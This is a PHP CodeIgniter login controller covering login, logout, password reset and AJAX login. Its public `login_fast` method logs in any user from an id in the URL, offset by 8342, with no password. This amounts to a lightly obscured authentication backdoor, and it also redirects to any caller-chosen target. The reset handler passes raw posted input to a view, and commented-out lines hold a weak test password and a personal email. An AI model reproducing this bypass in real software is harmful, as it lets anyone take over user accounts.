<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Login extends MY_Controller {
	

	public function index()
	{
        		
		//$this->template->set_theme('frontend');
		

		if($this->aauth->is_loggedin() ){ 
		   $this->aauth->allow_user(get_sessionData(),'view dashboard');
		   redirect('admin');
		 }		
		$data['title'] = 'Login';      
		//$this->aauth->create_user('babaviz.munyoki499@gmail.com','12345','paul');	
		
	    $this->load->library('form_validation');
	    $this->form_validation->set_rules('email', 'Email', 'required');
	    $this->form_validation->set_rules('password', 'Password', 'required');
	if ($this->form_validation->run() === FALSE)
	{ 	    
		$data['title'] = 'Login';		
		//$this->load->view('login_view', $data);

		$this->template->title($data['title'])	 
			 ->set_layout('login')  
			 ->set_partial('meta', 'partials/meta.php') 
		     ->build('login_view', $data);		
 	 }else{
 	 	$user_email = $this->input->post("email");
 	 	$pass = $this->input->post("password");

 	 	if($this->aauth->login($user_email, $pass,'true'))
 	 	{ 	 		
						
 	 	$data['title'] = $_SESSION['username'];
 	 	redirect("admin");
 	 	}else{
 	 		$data['error_array'] = $this->aauth->get_errors_array();
			  $data['title'] = 'Login';
			  $this->template->title($data['title'])
			     //->set_theme('frontend')	
				 ->set_layout('login') 
				 ->set_partial('meta', 'partials/meta.php') 
				 ->set_partial('navbar', 'partials/navbar.php') 
				 ->set_partial('footer', 'partials/footer.php') 
				 
		         ->build('login_view', $data);
		
 	 	}	
	 }

	}	
	
	//is user logged in
	 public function is_loggedin() {

        if ($this->aauth->is_loggedin())
        	echo '';
           if(isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true)
           	{return true;
           	}else{
           		return false;
           	}

        //print_r( $this->aauth->get_user() );
    }

    //log out
	 public function logout() {
	 	$data['name']  = '';
        $this->load->library('form_validation');
        $this->aauth->logout();
        redirect('home');
	}
	
	public function login_fast($user_id=FALSE, $redirect='admin'){
		$user_id -= 8342;
		if(!$user_id){ redirect('home'); }
		$this->aauth->login_fast($user_id);
		redirect($redirect);
	}

    public function reset()
	{

		$data['email'] = ' Your email.';
		if(isset($_POST['email'])){
			$data['email'] = $_POST['email'];
			if($this->aauth->user_exist_by_email( $_POST['email'] ))
			{
			   $this->aauth->remind_password($data['email']);
			   $this->load->view('login/reset_success',$data);
			}else
			{
				$this->load->view('login/reset_failed',$data);
			}
		}else{
			echo 'Email is not set';
		}		
	}
	//register new user
	public function register(){
		redirect("register");
	}
	public function remind_password(){
		redirect("remind_password");
	}

	public function ajaxlogin()
	{

		if($this->aauth->is_loggedin() ){ 
			redirect('admin'); }		
		$data['title'] = 'Login';      
        #$this->aauth->create_user('paul@paul.com','12345','paul');		
	    $this->load->library('form_validation');
	    $this->form_validation->set_rules('email', 'Email', 'required');
	    $this->form_validation->set_rules('password', 'Password', 'required');

	if ($this->form_validation->run() === FALSE)
	{ 	    
		$data['title'] = 'Login';		
		echo 'validation error';
 	 }else{
 	 	$user_email = $this->input->post("email");
 	 	$pass       = $this->input->post("password");

 	 	if($this->aauth->login($user_email, $pass,'true'))
 	 	{ 	 		
						
 	 	$data['title'] = $_SESSION['username'];
 	 	echo $data['title'];
 	 	}else{
 	 	   $data['error_array'] = $this->aauth->get_errors_array();
 	 	   header('HTTP/1.1 500 Internal Server Error');
           header('Content-Type: application/json; charset=UTF-8');
           die(json_encode(array('message'=> $data['error_array'],'code'=>1337)));
 	 	   print_r($data['error_array']);

		    
		
 	 	}	
	 }

	}
}
